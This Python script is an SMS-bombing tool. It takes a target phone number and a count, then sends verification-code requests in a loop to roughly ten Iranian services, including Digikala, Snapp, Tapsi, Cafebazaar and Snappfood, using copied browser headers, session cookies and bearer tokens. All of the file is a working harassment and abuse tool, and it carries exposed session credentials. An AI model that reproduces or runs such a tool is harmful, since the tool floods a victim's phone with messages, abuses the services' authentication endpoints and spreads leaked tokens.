import requests


print("******************************************")
print("******************************************")
print("***** devloper : MOHAMMAD  DOSTIPOR ******")
print("******************************************")
print("******************************************")
phone = input("ENTER THE PHONE PHONE NUMBER : ")
print("------------------------------------------")
print("------------------------------------------")
Number =int(input("ENTER THE NUMBER : "))
print("******************************************")
print("******************************************")

for X in range(Number):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.shabdizgroup.com/',
        'Origin': 'https://www.shabdizgroup.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
    print(response)
    
    
    
    
    
    
    
    
    cookies = {
        'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
        'analytics_session_token': '3bece941-469f-7db3-57ca-c75c486639e0',
        'analytics_token': 'b4343320-839a-748e-c8e6-f585f449c0a9',
        'yektanet_session_last_activity': '5/12/2024',
        '_yngt_iframe': '1',
        '_ga_RVTCLF1865': 'GS1.1.1715541995.1.1.1715542022.33.0.0',
        '_ga': 'GA1.1.1549208832.1715541996',
        '_yngt': '6a61d24f-ff17f-f3f9c-c1173-3b63009c57372',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.sheypoor.com/session',
        'Content-Type': 'application/json;charset=utf-8',
        'Origin': 'https://www.sheypoor.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    json_data = {
        'username': phone,
    }

    response = requests.post('https://www.sheypoor.com/api/v10.0.0/auth/send', cookies=cookies, headers=headers, json=json_data)
    print(response)
        
        
        
        
        
        
        
        
    cookies = {
        '_gcl_aw': 'GCL.1715542605.EAIaIQobChMIseyple6IhgMVUktBAh2DRQ5LEAAYASAAEgKGYPD_BwE',
        '_gcl_au': '1.1.1480437398.1715542605',
        '_ga_43SWEC8CH3': 'GS1.1.1715542606.1.1.1715542640.26.0.0',
        '_ga': 'GA1.1.1866004704.1715542606',
        'cw_conversation': 'eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiI5NGIxNzNhNC0xMzgzLTQ4NjktYWQxMS00NzkyMDQxZjhmOWEiLCJpbmJveF9pZCI6M30.1Uz6vzqbWUxbz3mTwE_qcbmTvuVj_VqkPPKZMwqnQ9o',
        'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}',
        'analytics_session_token': 'e81fc00e-c33d-a845-1bcf-686a6b8dcd89',
        'analytics_token': '11dfda95-5ceb-3475-ab1e-f9064cc8ea33',
        'yektanet_session_last_activity': '5/12/2024',
        '_yngt_iframe': '1',
        '_yngt': '262ff31b-b23fa-a553e-e5962-2fdc85648209a',
        'mp_998a65f2ebe6e503c6059187cc9ae771_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f6e4ed5cf47e9-09fa4df8e2ed6d-b7b2532-13c680-18f6e4ed5cf47e9%22%2C%22%24device_id%22%3A%20%2218f6e4ed5cf47e9-09fa4df8e2ed6d-b7b2532-13c680-18f6e4ed5cf47e9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'fa',
        'Content-Type': 'application/json',
        'device': 'web',
        'deviceID': '6',
        'user-token': '9uy6l6aYM2szFrtM58HA9aibUbC3rWLgcL0LGIPcbNHv2b2vzhgdA5b66FJoQNvf',
        'Origin': 'https://www.azki.co',
        'Connection': 'keep-alive',
        'Referer': 'https://www.azki.co/?gad_source=1&gclid=EAIaIQobChMIseyple6IhgMVUktBAh2DRQ5LEAAYASAAEgKGYPD_BwE',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',

    }

    json_data = {
        'phoneNumber': phone,
    }

    response = requests.post(
        'https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    print(response)
    
    
    
    
    
    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Referer': 'https://cafebazaar.ir/',
        'Origin': 'https://cafebazaar.ir',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        'properties': {
            'language': 2,
            'clientID': 'tzgp5jhwlbrmg3vhl7wg3aowazjklwan',
            'deviceID': 'tzgp5jhwlbrmg3vhl7wg3aowazjklwan',
            'clientVersion': 'web',
        },
        'singleRequest': {
            'getOtpTokenRequest': {
                'username': phone,
            },
        },
    }

    response = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', headers=headers, json=json_data)
    print(response)
    
    
    
    
    
    
    
    cookies = {
        'JSESSIONID': '19ADAA18494EA00739BBA4DC58448FEC',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Referer': 'https://kasbinoapp.ir/kasbinoo/',
        'Origin': 'https://kasbinoapp.ir',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Connection': 'keep-alive',

    }

    data = '{"p1001":phone,"p1002":"registerSms","token":"175807d4-e307-4fdf-858c-3b23ffb36fb5.e000af00-d00d-0da0-0f00-000d00000cc0","RC":"7be86c2a5b54"}'

    response = requests.post('https://kasbinoapp.ir/kasbinoEngine1/RequestC', cookies=cookies, headers=headers, data=data)
    print(response)








    cookies = {
        '_sp_id.13cb': 'd5b7092e-2e01-44a7-9c06-b278c409bf52.1708613485.2.1715543280.1708613500.87fa22ad-27ae-46b1-ab80-b88da2d2740a.c1967b6f-50c5-4288-9a2e-e2b15bdb0fe7.2218ff53-d7b6-4312-a3cb-9eb90e5a3c5f.1715543260618.8',
        '_ga_QQKVTD5TG8': 'GS1.1.1715543266.2.1.1715543282.0.0.0',
        '_ga': 'GA1.1.946074157.1708613494',
        'tracker_glob_new': '4hDlUyn',
        '_sp_ses.13cb': '*',
        'tracker_glob_new': '4hDlUyn',
        'tracker_session': '3gTNTO6',
        'TS01c77ebf': '010231059171b1cc1636e0aa9db6f91c6b3fb5e13deae04cb5d5e9da56d02c5d7f82afa6769777ac454c1fc5fdf398509e0215aa87c6ecc71e23221e37386421d92e0a2d18',
        'TS01b6ea4d': '0102310591e2e299148924bb4d4b6737d8851bb2d4eae04cb5d5e9da56d02c5d7f82afa67650cbf5733de2cd3b48525285a184c1053bfe2427b44ab0fd1aeb076f284443043c0a94b95cebd67671fc9c1bccffe59c',
        'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Referer': 'https://www.digikala.com/',
        'X-Web-Optimize-Response': '1',
        'X-Web-Client': 'desktop',
        'Origin': 'https://www.digikala.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
    }

    json_data = {
        'backUrl': '/',
        'username': phone,
        'otp_call': False,
    }

    response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
    print(response)
    
    




    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://snapp.ir/',
        'content-type': 'application/json',
        'Origin': 'https://snapp.ir',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://api.snapp.ir/api/v1/sms/link', headers=headers, json=json_data)
    print(response)
    
    
    
    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'fa',
        'Content-Type': 'application/octet-stream',
        'project': 'gap',
        'APPVERSION': 'web',
        'X-VERSION': '5.0.0-beta.3',
        'Origin': 'https://web.gap.im',
        'Connection': 'keep-alive',
        'Referer': 'https://web.gap.im/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
    }

    data = 'Þ\x00\x01¦mobile\xad+phone'.encode()

    response = requests.post('https://core.gap.im/v1/user/sendOTP.gap', headers=headers, data=data)
    print(response)
    
    
    
    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://app.tapsi.cab/',
        'content-type': 'application/json',
        'x-agent': 'v2.2|passenger|WEBAPP|6.21.10||5.0',
        'Origin': 'https://app.tapsi.cab',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
    }

    json_data = {
        'credential': {
            'phoneNumber': phone,
            'role': 'PASSENGER',
        },
        'otpOption': 'SMS',
    }

    response = requests.post('https://api.tapsi.cab/api/v2.2/user', headers=headers, json=json_data)
    print(response)
    
    
    
    
    cookies = {
        'UUID': '6aa00ed1-bbbd-4d6b-bff8-debfbc148bf3',
        'PHPSESSID': '93ddd38a53fc18ce697191ff97ce6ddc',
        'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2Bl5Octs38b3v%2Ba9T6kzGw49rpMXdcSgUZYnrbvZ%2BsuRobmpU5IZT8t4iokaWFcjWJDB5V9WSXk5w%3D%3D',
        'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2BhWGZtmxLrWpH5phQm3bIvTP8cDCCqwoY%3D',
        'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX180MxsuqA4bjkRmmZLL%2FmmaLxSyn7%2B0F6g%3D',
        'rl_trait': 'RudderEncrypt%3AU2FsdGVkX1%2BwV20iSmvPiUzeS69%2FcoDWRdPAf91DspA%3D',
        'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX1%2FAg4aSRIYFX%2FA7LGxyrzCqYFFIzFwN8Mw%3D',
        'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX1%2FLL6ECLK9uGQlSEL1C4s4ZLxoQ6M6%2BCwSzIG4q1nNqKd2rsrdvtQUe',
        'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX1%2FD8CkPndewmvVVjPID9wqnhgj%2FdcWLuLU8x1M2Q3K6J84xMcnQ69BD',
        'jwt-access_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjRlYTliMjNlNWY4YTYyNzkxNzNkYjliYjA3ZmEwYWE5NjQ2MmI3ZGRmNmQ2YWQzNWYyYThjMTAxMTZhMWMyMzBjZjMwYzRkNjliM2E1YTM4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNGVhOWIyM2U1ZjhhNjI3OTE3M2RiOWJiMDdmYTBhYTk2NDYyYjdkZGY2ZDZhZDM1ZjJhOGMxMDExNmExYzIzMGNmMzBjNGQ2OWIzYTVhMzgiLCJpYXQiOjE3MTU1ODI4MjUsIm5iZiI6MTcxNTU4MjgyNSwiZXhwIjoxNzE4MjYxMzQ1LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.LvBA8RZegOX6sSB9KUKpjsBgGHBUBtAn9QD8_lhpNT2JDWv6Ec_U6328E7O6-KkFVxQJfmPvKZvfu-iimZbLe-GRcYnn1aD6wmWOhzh9jD-rXdnnvzVC41sRF1L5cVYIWhCSOuR9AHy-5OmOZzrJvVqhDlnG-js5Zvn9Pq-B3CEtad__BA2cFtmMBvOir9Qh3547WS9-kCDUbZw_0mW0Lh8dkEci2_HjkxsMtyQtLGFjnZn5lAjjG8sKHOoHf2aTHz2SxyADCsUYsdj9qlP5hLX57wEAOOwW52CzbNm8Pq3rzJ9PvX1309pOm-3RI6pk9qWYXmFU_j_4F-UGwFMff9Zj__kB1hkgIleD6HPZY8ERKBvkmdpmgVoAof876qtdqvlSrn3TAgXUgNuM0VaAoMApmRY_1PqvQ4iVbX3V6WKnZfTUtV7_OxXAlQD_gRD0ogocJe2-B0JG2dHmEbx1Ve2Eu6QX0WbPUnL-CMtx7M-XTFjVUZYV6KtgZPX_J2ZZe9_cY1kl1x-S2ThXhRAFrNDPK2RZvW2wi_x7lLIx_XvKljzvaTolPJiXOUGjSWA4Z3WIjJqbABXL3GnsPt_oXh3Ji7QFOl2LZLVQwmrDQ_158IH2tSC_a3jrQE8ssvXVwcf44ZXCvbplHH7U3QpsmlB0xrLZMejhLCgwd5MM_1vg8Xm67SLKYnVuj_TLJcjtAMXrSa3rNSaTXwBs5NLZfaQPHABqvyqe5ZK7vNiJCxiSedByeatR_0NdznaKraq2k3KX5Za2m8DE1r0VNh4fQ4wP5ALaffS21UBxyRw11OhYs6PFexPHKb9aHr2AckeunR1QK2A0n06DyVIglwaLZ0IvjsQ3BG55zbn0HURhOaKw3wTFIobbp8nVKrDCADeeJRdqO-dK5ZnFnhPIZSEPa0HmJaXGp806RS69o8C4V6GyhgHuG0WJkdCh6MOBeOAJ4qoyP5FF_oouACXeNg3nGr4fXxskLYwaDTdanthsg2dSLKqUZt9QhfNq8hWcFD4LJb18XVBBsFjantCid5zAPZJa6JMTJ-kbULGM1hiA1HxvYqYE10vlpcwPtVR5da4fEA5Rwtj9En9IZq9icYGAus_iHhEBcrIOQ-kf3xxyTxe59rCewtSTy3UsjKZwkuSwLD5k7mVCkl-2w5f2eCrH0ETiU9QpW_TGBY65svo-lCCy6kzRw937e8LWzDlv6Qe1Y7F3M6k6OVX92679DMqMpZVKbbVT5g8vPWmdsV89rXDQcVHinhF47bOwbh6geo5vwiOlIAj9L8HnxTEGuqKZliCoSNK6_vxJCvw98g9u4LWQXBpVUjwSVlh4WWtIJngxjBS-sNFRwrFEtb010E6YoUAMiYuM58YVKBr9rQbWjoUd6IL4CZHyZCGpfTQN3cz4Q0tLep58jIa3nuDpRuXk1C8zhZQU4n7O29CkKOl00NJv-ni1bU8GtLjtgFYkDcCTgLJTEEDwzmqGQX8HlRE-UEMRKyzgfcoI3jjeqYLwGDRBiT32sw7hGokzBFrQRhkXsTRNvtvYU2BuUXFoSFi6MFz50FcUIx-cHPLBT2FG6cdWGkFyk5QxfRZmeKQ3TOAg3Pol8zI_ucHoNGDmpWpdeYFJp5u7lXZg7e21IQG_lWlladB73M0-QNvZWanKPnVAIU8FoP-tPbGuRzjp9G9fg5Za0mrRX0TuWQefX8GbYVMXc0mhRkIYtSdMomEiBAVYtEfaoRZtXJ9YAcQP_XueZvFQY_juL7-LxJKAMOiG5VgfNygk3ys8DcXdWYnTv8aydaFkza6Akltk4O1PKwqwR4mqjVIij4LTLBGRmSei7fOXxNJ8OWBk260YcWK1ZP5ngNK1YXKvvQ1x7AaYT8gpJ2pl23dF_CNcGebbA5GK_xc1VBpoMn-27wIQpbYv_5vqj8xENi2QU0bFFN7zPCgpNh12x8LM9XZsCur-D5Ju-lk6grWYxWD0KeHsGw-swGNBn5H_SQx6IFlHHYASZJD07vpPuQ39qZqo5Dj3ndkRi5KVqBTECKtOJDTOGpFqQQN3oZMexGGzaagEELW-2pTDimm-pYT1u1vva4CcRA3KvRfpqpln8IukAQakn_pclGOSxl7TDp7ymHaOBz5nR8nWwaqqr08uB1JM1fD4d0fjPqqjsfxMAexeuSHg1Jn4gyuT4wybMA16DbssX-xfmVjkWGVm_fbNV0XysLXVLUbiyNgc3LqC8T-Xn-AqdjeT9LGQspeIASroAqR31fj90pR-iZkH21MuNfzvYhgzHXrIcfJ8iJ6mNESwOU6ALImaxWuqIVKY2hRYXpYYFyGxeidjD9fgIxPbQ6vCliJOhvLPLvzU_smNiQOkjDKoH8xgoGRjJqs32dNgc9j_KEfIljEDdBBamI3NJrGrCHTbCBiGnAyas-2z54fppO9-mgn3IflaOboY3lVvI6AJJ5VbA0HtrkfJdEAyygDpbz3vso1hD3C3mOyKCQsFPI9hvO8yFA_c7DgvBcPnc0RQ990mNfFDLRR3nJCqqLh6HcLuYdQPPx9ESsNW0LhKRaWghKcokMkut67WhgQjNDxjT9A1hqeOowDvl6QoBirMK45o1CxsieBpCZi98rzgoqwJQM79TyJTmslcy9oLr2BqkDnPkShVvVeuxWH_fLP21FVZf_Byr2-JY-MDc9sZT-kxK5QJgJ5hOn5fQ8xFA0H6Ar17PQZXJqkjUGhMywR_FNMXDcrJO3I',
        'jwt-refresh_token': 'undefined',
        'jwt-token_type': 'Bearer',
        'jwt-expires_in': '2678400',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjRlYTliMjNlNWY4YTYyNzkxNzNkYjliYjA3ZmEwYWE5NjQ2MmI3ZGRmNmQ2YWQzNWYyYThjMTAxMTZhMWMyMzBjZjMwYzRkNjliM2E1YTM4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNGVhOWIyM2U1ZjhhNjI3OTE3M2RiOWJiMDdmYTBhYTk2NDYyYjdkZGY2ZDZhZDM1ZjJhOGMxMDExNmExYzIzMGNmMzBjNGQ2OWIzYTVhMzgiLCJpYXQiOjE3MTU1ODI4MjUsIm5iZiI6MTcxNTU4MjgyNSwiZXhwIjoxNzE4MjYxMzQ1LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.LvBA8RZegOX6sSB9KUKpjsBgGHBUBtAn9QD8_lhpNT2JDWv6Ec_U6328E7O6-KkFVxQJfmPvKZvfu-iimZbLe-GRcYnn1aD6wmWOhzh9jD-rXdnnvzVC41sRF1L5cVYIWhCSOuR9AHy-5OmOZzrJvVqhDlnG-js5Zvn9Pq-B3CEtad__BA2cFtmMBvOir9Qh3547WS9-kCDUbZw_0mW0Lh8dkEci2_HjkxsMtyQtLGFjnZn5lAjjG8sKHOoHf2aTHz2SxyADCsUYsdj9qlP5hLX57wEAOOwW52CzbNm8Pq3rzJ9PvX1309pOm-3RI6pk9qWYXmFU_j_4F-UGwFMff9Zj__kB1hkgIleD6HPZY8ERKBvkmdpmgVoAof876qtdqvlSrn3TAgXUgNuM0VaAoMApmRY_1PqvQ4iVbX3V6WKnZfTUtV7_OxXAlQD_gRD0ogocJe2-B0JG2dHmEbx1Ve2Eu6QX0WbPUnL-CMtx7M-XTFjVUZYV6KtgZPX_J2ZZe9_cY1kl1x-S2ThXhRAFrNDPK2RZvW2wi_x7lLIx_XvKljzvaTolPJiXOUGjSWA4Z3WIjJqbABXL3GnsPt_oXh3Ji7QFOl2LZLVQwmrDQ_158IH2tSC_a3jrQE8ssvXVwcf44ZXCvbplHH7U3QpsmlB0xrLZMejhLCgwd5MM_1vg8Xm67SLKYnVuj_TLJcjtAMXrSa3rNSaTXwBs5NLZfaQPHABqvyqe5ZK7vNiJCxiSedByeatR_0NdznaKraq2k3KX5Za2m8DE1r0VNh4fQ4wP5ALaffS21UBxyRw11OhYs6PFexPHKb9aHr2AckeunR1QK2A0n06DyVIglwaLZ0IvjsQ3BG55zbn0HURhOaKw3wTFIobbp8nVKrDCADeeJRdqO-dK5ZnFnhPIZSEPa0HmJaXGp806RS69o8C4V6GyhgHuG0WJkdCh6MOBeOAJ4qoyP5FF_oouACXeNg3nGr4fXxskLYwaDTdanthsg2dSLKqUZt9QhfNq8hWcFD4LJb18XVBBsFjantCid5zAPZJa6JMTJ-kbULGM1hiA1HxvYqYE10vlpcwPtVR5da4fEA5Rwtj9En9IZq9icYGAus_iHhEBcrIOQ-kf3xxyTxe59rCewtSTy3UsjKZwkuSwLD5k7mVCkl-2w5f2eCrH0ETiU9QpW_TGBY65svo-lCCy6kzRw937e8LWzDlv6Qe1Y7F3M6k6OVX92679DMqMpZVKbbVT5g8vPWmdsV89rXDQcVHinhF47bOwbh6geo5vwiOlIAj9L8HnxTEGuqKZliCoSNK6_vxJCvw98g9u4LWQXBpVUjwSVlh4WWtIJngxjBS-sNFRwrFEtb010E6YoUAMiYuM58YVKBr9rQbWjoUd6IL4CZHyZCGpfTQN3cz4Q0tLep58jIa3nuDpRuXk1C8zhZQU4n7O29CkKOl00NJv-ni1bU8GtLjtgFYkDcCTgLJTEEDwzmqGQX8HlRE-UEMRKyzgfcoI3jjeqYLwGDRBiT32sw7hGokzBFrQRhkXsTRNvtvYU2BuUXFoSFi6MFz50FcUIx-cHPLBT2FG6cdWGkFyk5QxfRZmeKQ3TOAg3Pol8zI_ucHoNGDmpWpdeYFJp5u7lXZg7e21IQG_lWlladB73M0-QNvZWanKPnVAIU8FoP-tPbGuRzjp9G9fg5Za0mrRX0TuWQefX8GbYVMXc0mhRkIYtSdMomEiBAVYtEfaoRZtXJ9YAcQP_XueZvFQY_juL7-LxJKAMOiG5VgfNygk3ys8DcXdWYnTv8aydaFkza6Akltk4O1PKwqwR4mqjVIij4LTLBGRmSei7fOXxNJ8OWBk260YcWK1ZP5ngNK1YXKvvQ1x7AaYT8gpJ2pl23dF_CNcGebbA5GK_xc1VBpoMn-27wIQpbYv_5vqj8xENi2QU0bFFN7zPCgpNh12x8LM9XZsCur-D5Ju-lk6grWYxWD0KeHsGw-swGNBn5H_SQx6IFlHHYASZJD07vpPuQ39qZqo5Dj3ndkRi5KVqBTECKtOJDTOGpFqQQN3oZMexGGzaagEELW-2pTDimm-pYT1u1vva4CcRA3KvRfpqpln8IukAQakn_pclGOSxl7TDp7ymHaOBz5nR8nWwaqqr08uB1JM1fD4d0fjPqqjsfxMAexeuSHg1Jn4gyuT4wybMA16DbssX-xfmVjkWGVm_fbNV0XysLXVLUbiyNgc3LqC8T-Xn-AqdjeT9LGQspeIASroAqR31fj90pR-iZkH21MuNfzvYhgzHXrIcfJ8iJ6mNESwOU6ALImaxWuqIVKY2hRYXpYYFyGxeidjD9fgIxPbQ6vCliJOhvLPLvzU_smNiQOkjDKoH8xgoGRjJqs32dNgc9j_KEfIljEDdBBamI3NJrGrCHTbCBiGnAyas-2z54fppO9-mgn3IflaOboY3lVvI6AJJ5VbA0HtrkfJdEAyygDpbz3vso1hD3C3mOyKCQsFPI9hvO8yFA_c7DgvBcPnc0RQ990mNfFDLRR3nJCqqLh6HcLuYdQPPx9ESsNW0LhKRaWghKcokMkut67WhgQjNDxjT9A1hqeOowDvl6QoBirMK45o1CxsieBpCZi98rzgoqwJQM79TyJTmslcy9oLr2BqkDnPkShVvVeuxWH_fLP21FVZf_Byr2-JY-MDc9sZT-kxK5QJgJ5hOn5fQ8xFA0H6Ar17PQZXJqkjUGhMywR_FNMXDcrJO3I',
        'Origin': 'https://snappfood.ir',
        'Connection': 'keep-alive',
        'Referer': 'https://snappfood.ir/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    params = {
        'lat': '35.774',
        'long': '51.418',
        'optionalClient': 'WEBSITE',
        'client': 'WEBSITE',
        'deviceType': 'WEBSITE',
        'appVersion': '8.1.1',
        'UDID': '6aa00ed1-bbbd-4d6b-bff8-debfbc148bf3',
        'locale': 'fa',
    }

    data = {
        'cellphone':phone,
    }

    response = requests.post(
        'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print(response)
    
    
    
    
